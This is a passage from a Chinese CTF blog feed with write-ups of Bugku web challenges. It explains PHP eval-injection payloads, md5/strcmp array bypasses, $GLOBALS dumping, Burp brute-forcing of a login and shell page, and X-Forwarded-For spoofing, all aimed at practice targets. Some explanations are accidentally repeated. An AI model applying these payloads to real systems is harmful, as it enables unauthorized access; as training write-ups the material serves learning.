<br></code></pre></td></tr></table></figure><p>一开始看到源码中提示了一个文件2.php，切换到这个文件，会发现返回的页面依旧是这个页面，没办法，那就看看源码</p><p>源码中给$key赋值了flag，并在下面的if判断中利用die函数输出了这个值，那么我们现在的目标就是让下面这个if判断成立，要成立就要$IM为真，此处$IM为preg_match函数的一个返回值，这个函数是判断搜索第二个参数与第一个参数的一个正则匹配，即第二个参数<code>trim($_GET[&quot;id&quot;])</code>中是否存在第一个参数<code>&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</code>，如果存在返回true，不存在返回false</p><p>解释一下这个参数中涉及到的一些符号</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lua">. 为通配符，表示一个任意非\n和\r单字符<br><br>.*为字符串通配符，详情可百度<span class="hljs-string">&quot;贪婪匹配&quot;</span><br><br>\为转义符<br><br>[a-z]为任意小写字母<br><br><span class="hljs-string">[[:punct:]]</span>为任意符号<br><br>/i为不区分大小写<br><br>()标记一个子表达式的开始和结束位置，此处不用理会<br></code></pre></td></tr></table></figure><p>最后得到payload: ?id=keyakeyaaaakey:/a/akeya?</p><p>成功拿到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102656753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="web24："><a href="#web24：" class="headerlink" title="web24："></a>web24：</h4><p>点开题目之后，是一大段文字，讲了个小段子，玩了一下php的梗</p><p><img src="https://img-blog.csdnimg.cn/20210425102715155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>查看页面源码，发现给了一个链接</p><p><img src="https://img-blog.csdnimg.cn/20210425102735413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>点击进去，这个txt给了一段源码</p><p><img src="https://img-blog.csdnimg.cn/20210425102757162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> != <span class="hljs-variable">$v2</span> &amp;&amp; md5(<span class="hljs-variable">$v1</span>) == md5(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!strcmp(<span class="hljs-variable">$v3</span>, <span class="hljs-variable">$flag</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看了源码之后，会发现这题和前面的web16很像，都是既要md5值相等，又要原值不相等</p><p>有两个思路，一是利用md5()函数对数组不起效，将两个变量以数组形式输入，这样两个md5()都返回null，满足相等条件</p><p>二是利用php在处理长的字符串时会转换成科学计数法，我们可以找两个md5值是0e开头的，它在解析时会当做0的xx次方，都是0，满足条件</p><p>这里还多出来一个strcmp函数，这个函数的作用是比较两个字符串，且只有两个字符串相等时，才会返回0，这里利用strcmp对数组不起作用，直接返回0来绕过</p><p>构造payload：?v1[]=1&amp;v2[]=2&amp;v3[]=1</p><p>得到flag</p><p>看了源码之后，会发现这题和前面的web16很像，都是既要md5值相等，又要原值不相等</p><p>有两个思路，一是利用md5()函数对数组不起效，将两个变量以数组形式输入，这样两个md5()都返回null，满足相等条件</p><p>二是利用php在处理长的字符串时会转换成科学计数法，我们可以找两个md5值是0e开头的，它在解析时会当做0的xx次方，都是0，满足条件</p><p>这里还多出来一个strcmp函数，这个函数的作用是比较两个字符串，且只有两个字符串相等时，才会返回0，这里利用strcmp对数组不起作用，直接返回0来绕过</p><p>构造payload：?v1[]=1&amp;v2[]=2&amp;v3[]=1</p><p>得到flag</p><p><img src="https://img-blog.csdnimg.cn/20210425102911912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku web总结_1</title>
    <link href="/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_1/"/>
    <url>/2021/05/13/bugku%20web%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93_1/</url>
    
    <content type="html"><![CDATA[<p>﻿## bugku web总结(1-12)</p><p>因为报名了今年的iscc，之前没怎么打过ctf，所以在四月份做了一部分题目，练习一下，这篇文章做一下总结</p><h4 id="web1："><a href="#web1：" class="headerlink" title="web1："></a>web1：</h4><p>ctrl+u，查看页面源码，直接能看到flag，没啥好说的</p><h4 id="web2："><a href="#web2：" class="headerlink" title="web2："></a>web2：</h4><p>让你做三位的算数题，但是答案只让你填一位，好在是前端验证，我们可以直接改，f12打开控制台，源码里有个maxlength变量，初始值设了个1，我们改成3，就可以正常输入了，输入正确答案，flag就有了</p><h4 id="web3："><a href="#web3：" class="headerlink" title="web3："></a>web3：</h4><p>打开之后，给了一串源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$what</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;what&#x27;</span>]; <span class="hljs-regexp">//</span>接受post过来的参数what，存到what里 <br>echo <span class="hljs-variable">$what</span>;     <span class="hljs-regexp">//</span>打印 <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$what</span>==<span class="hljs-string">&#x27;flag&#x27;</span>)     <span class="hljs-regexp">//</span>如果值是flag <br>echo <span class="hljs-string">&#x27;flag&#123;****&#125;&#x27;</span>;<span class="hljs-regexp">//</span>    打印flag<br></code></pre></td></tr></table></figure><p>让我们GET传一个what参数，内容是flag的话，就告诉我们flag</p><h4 id="web4："><a href="#web4：" class="headerlink" title="web4："></a>web4：</h4><p>与web3几乎完全相同，只是改成了post传参，打开hackbar，给一个post参数what=flag，拿到flag</p><h4 id="web5："><a href="#web5：" class="headerlink" title="web5："></a>web5：</h4><p>同样是给了一串源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];  <span class="hljs-regexp">//g</span>et传参<br><span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$num</span>))    <span class="hljs-regexp">//i</span>s_numeric()函数判断参数是否为数字或数字字符串，如果是，返回ture<br>&#123;<br>echo <span class="hljs-variable">$num</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">1</span>)                <span class="hljs-regexp">//</span>如果变量<span class="hljs-variable">$num</span>为<span class="hljs-number">1</span>，打印flag<br>echo <span class="hljs-string">&#x27;flag&#123;**********&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>乍一看两次判断相悖，第一次要求num不是数字或数字字符串，第二次要求num=1，但细看的话，实际上两次判断并不相悖，第一次判断，我们传递的只要不是纯数字，就可以通过，第二次判断，$num==1，php是弱类型语言，数字和字符(串)的比较是存在类型转换的，对字符串来说是以开头的数字为准，所以在松散比较中，1”qid#@# ==1 是正确的，此处如果= =换成= = =，大概就不行了</p><p>下面是两个有关强弱类型和php语言的网站</p><p><a href="https://www.zhihu.com/question/19918532">https://www.zhihu.com/question/19918532</a><br><a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a></p><h4 id="web6："><a href="#web6：" class="headerlink" title="web6："></a>web6：</h4><p>一直弹窗，flag就在这里，当然知道flag在这里，不然我花金币进来干嘛，用火狐的话，会有个选项直接不让他弹窗，我们也可以用burp把这个页面拦下来，repeater给它重发一下，burp内嵌的页面显示可不会弹窗，直接查看响应报文，给了一行注释，内容是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#75;</span><span class="hljs-symbol">&amp;#69;</span><span class="hljs-symbol">&amp;#89;</span><span class="hljs-symbol">&amp;#123;</span><span class="hljs-symbol">&amp;#74;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#52;</span><span class="hljs-symbol">&amp;#50;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#104;</span><span class="hljs-symbol">&amp;#74;</span><span class="hljs-symbol">&amp;#75;</span><span class="hljs-symbol">&amp;#45;</span><span class="hljs-symbol">&amp;#72;</span><span class="hljs-symbol">&amp;#83;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#73;</span><span class="hljs-symbol">&amp;#73;</span><span class="hljs-symbol">&amp;#73;</span><span class="hljs-symbol">&amp;#125;</span><br></code></pre></td></tr></table></figure><p>用burp给它html解码，得到flag</p><h4 id="web7："><a href="#web7：" class="headerlink" title="web7："></a>web7：</h4><p>你必须让它停下，定期刷新，大概一秒刷一次，题目告诉我们在熊猫图片停下，结果图还刷不出来，burp抓包，送到repeater，反复的发送，然后看响应报文，刷到某张图片的时候就能看到flag</p><p><img src="https://img-blog.csdnimg.cn/20210416163229331.png#pic_center" alt="在这里插入图片描述"></p><h4 id="web8："><a href="#web8：" class="headerlink" title="web8："></a>web8：</h4><p>题目叫文件包含，点进去给了一串源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>; <span class="hljs-comment">//flag在flag.php里</span><br>    <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];  <span class="hljs-comment">//request方式接收参数hello</span><br>    <span class="hljs-keyword">eval</span>( <span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);    <span class="hljs-comment">//eval将参数视为php语句执行，var_dump输出参数值，并返回参数的数据类型</span><br>    show_source(<span class="hljs-keyword">__FILE__</span>);     <span class="hljs-comment">//show_source将文字增亮显示，__file__代表当前文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>题目已经告诉了我们需要包含flag.php，另外已经知道参数为hello，另外还有eval函数可以将括号内的内容当做代码执行，所以此时我们直接构造payload为?hello=show_source(‘flag.php’)，读取flag.php中的内容，此处不一定要利用show_source函数，其他读取函数例如print_r也可以</p><h4 id="web9："><a href="#web9：" class="headerlink" title="web9："></a>web9：</h4><p>点进去之后同样是给了一串代码，还提示我们flag在变量中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">flag In the variable ! <span class="hljs-meta">&lt;?php</span>  <br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;    <span class="hljs-comment">//flag</span><br>highlight_file(<span class="hljs-keyword">__file__</span>);   <span class="hljs-comment">//高亮显示</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;   <span class="hljs-comment">//isset检查参数是否设置，如设置且不为空，则返回ture，否则返回false</span><br>    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];   <span class="hljs-comment">//GET方式传参args,放入变量$args</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;    <span class="hljs-comment">//执行正则表达式匹配,/^开始符，\w表示单词字符，即大小写字//母和数字0-9，+代表多次匹配，$/结束。后面的args变量是被匹//配的。相当于在args变量里寻找符合正则表达式的部分，若有则返回1，若没有则返回0</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);   <span class="hljs-comment">//输出args error，并退出当前脚本</span><br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);  <span class="hljs-comment">//同web8</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很显然，这里跟web8最大的不同是，由于preg_match匹配全字母及数字0-9，我们很显然没法直接用web8那样的方法包含文件名flag1.php，而且我们也用不了像show_source()，因为里面包含符号，但开头提示了我们flag在变量中，可能他定义了某些变量中含有flag1.php，我们此时需要利用到超全局变量$GLOBALS，他会引用全局作用域中可用的全部变量，所以我们只需要构造payload为/?args=GLOBALS即可获取flag。</p><h4 id="web10："><a href="#web10：" class="headerlink" title="web10："></a>web10：</h4><p>头等舱，点开之后，什么也没有</p><p><img src="https://img-blog.csdnimg.cn/20210416163255318.png#pic_center" alt="在这里插入图片描述"></p><p>f12打开控制台，看下head，或者burp抓包扔给repeater，再发一下，看响应，就能看到flag了。</p><h4 id="web11："><a href="#web11：" class="headerlink" title="web11："></a>web11：</h4><p>点开以后是个黑页</p><p><img src="https://img-blog.csdnimg.cn/20210416163324261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>使用dirsearch扫过之后，会拿到一个/shell.php页面，让输密码</p><p><img src="https://img-blog.csdnimg.cn/20210416163359756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>打开burp，抓包丢给intruder模块，选用burp自带的密码集，爆破即可</p><h4 id="web12："><a href="#web12：" class="headerlink" title="web12："></a>web12：</h4><p>点开之后，给了一个登录框</p><p><img src="https://img-blog.csdnimg.cn/20210416163926991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>f12打开控制台，查看源码</p><p><img src="https://img-blog.csdnimg.cn/202104161639475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>注释的内容是一段base64加密文本dGVzdDEyMw==，解密后得到test123，估计是密码</p><p>burp丢给intruder，爆破用户名，会提示ip禁止访问</p><p><img src="https://img-blog.csdnimg.cn/20210416164004514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lpZnVqaWFkZW5n,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以xff修改ip访问，在报文中加入X-Forwarded-For: 127.0.0.1，再次爆破可以得到用户名为admin，输入用户名密码，得到flag</p><h4 id="web13："><a href="#web13：" class="headerlink" title="web13："></a>web13：</h4><p>点开之后，给了一个输入框，还提示看看源代码，右键查看源码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"> <br>var p<span class="hljs-number">1</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%53</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%20</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%45</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%42</span><span class="hljs-variable">%79</span><span class="hljs-variable">%49</span><span class="hljs-variable">%64</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%22</span><span class="hljs-variable">%21</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%74</span><span class="hljs-variable">%79</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%20</span><span class="hljs-variable">%61</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%36</span><span class="hljs-variable">%37</span><span class="hljs-variable">%64</span><span class="hljs-variable">%37</span><span class="hljs-variable">%30</span><span class="hljs-variable">%39</span><span class="hljs-variable">%62</span><span class="hljs-variable">%32</span><span class="hljs-variable">%62</span>&#x27;<span class="hljs-comment">;</span><br>var p<span class="hljs-number">2</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">%61</span><span class="hljs-variable">%61</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%38</span><span class="hljs-variable">%63</span><span class="hljs-variable">%66</span><span class="hljs-variable">%36</span><span class="hljs-variable">%65</span><span class="hljs-variable">%38</span><span class="hljs-variable">%37</span><span class="hljs-variable">%61</span><span class="hljs-variable">%37</span><span class="hljs-variable">%31</span><span class="hljs-variable">%31</span><span class="hljs-variable">%34</span><span class="hljs-variable">%66</span><span class="hljs-variable">%31</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%21</span><span class="hljs-variable">%30</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%45</span><span class="hljs-variable">%72</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%21</span><span class="hljs-variable">%31</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%45</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%42</span><span class="hljs-variable">%79</span><span class="hljs-variable">%49</span><span class="hljs-variable">%64</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%51</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%53</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>b&#x27;<span class="hljs-comment">;</span><br>eval(unescape(p<span class="hljs-number">1</span>) + unescape(&#x27;<span class="hljs-variable">%35</span><span class="hljs-variable">%34</span><span class="hljs-variable">%61</span><span class="hljs-variable">%61</span><span class="hljs-variable">%32</span>&#x27; + p<span class="hljs-number">2</span>))<span class="hljs-comment">;  //将p1和p2拼接后作为php语句执行</span><br></code></pre></td></tr></table></figure><p>经过url解码，得到如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSubmit</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> a=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;password&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;undefined&quot;</span>!=<span class="hljs-keyword">typeof</span> a)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.value)<br>            <span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;           <span class="hljs-comment">//如果我们传入的passwd参数等于这一串，返回1</span><br>        alert(<span class="hljs-string">&quot;Error&quot;</span>);<br>        a.focus();<br>        <span class="hljs-keyword">return</span>!<span class="hljs-number">1</span><br>    &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;<br><span class="hljs-comment">//如果我们传入的passwd参数等于这一串，返回1</span><br>        alert(<span class="hljs-string">&quot;Error&quot;</span>);<br>        a.focus();<br>        <span class="hljs-keyword">return</span>!<span class="hljs-number">1</span><br>    &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;<br></code></pre></td></tr></table></figure><p>很显然，要两个if全部通过，才能拿到flag，我们把67d709b2b54aa2aa648cf6e87a7114f1复制到输入框，成功拿到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cybox1.1靶机练习</title>
    <link href="/2021/05/09/cybox1-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/05/09/cybox1-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
